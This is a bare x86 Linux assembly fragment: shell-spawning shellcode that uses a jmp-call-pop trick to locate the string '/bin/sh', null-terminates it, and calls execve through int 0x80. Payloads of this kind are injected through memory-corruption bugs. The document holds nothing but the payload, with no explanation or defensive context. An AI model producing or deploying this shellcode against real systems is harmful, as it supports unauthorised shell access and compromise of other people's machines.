
	JMP _WANT_BIN_BASH
_GOT_BIN_BASH:
	XOR EAX,EAX
	MOV AL, 0x0b
	pop ebx
	xor edx,edx
	xor ecx,ecx
	mov byte ptr[ebx+7] ,dL
	INT 0X80
_WANT_BIN_BASH:
	CALL _GOT_BIN_BASH
	.ASCII "/bin/sh/0"
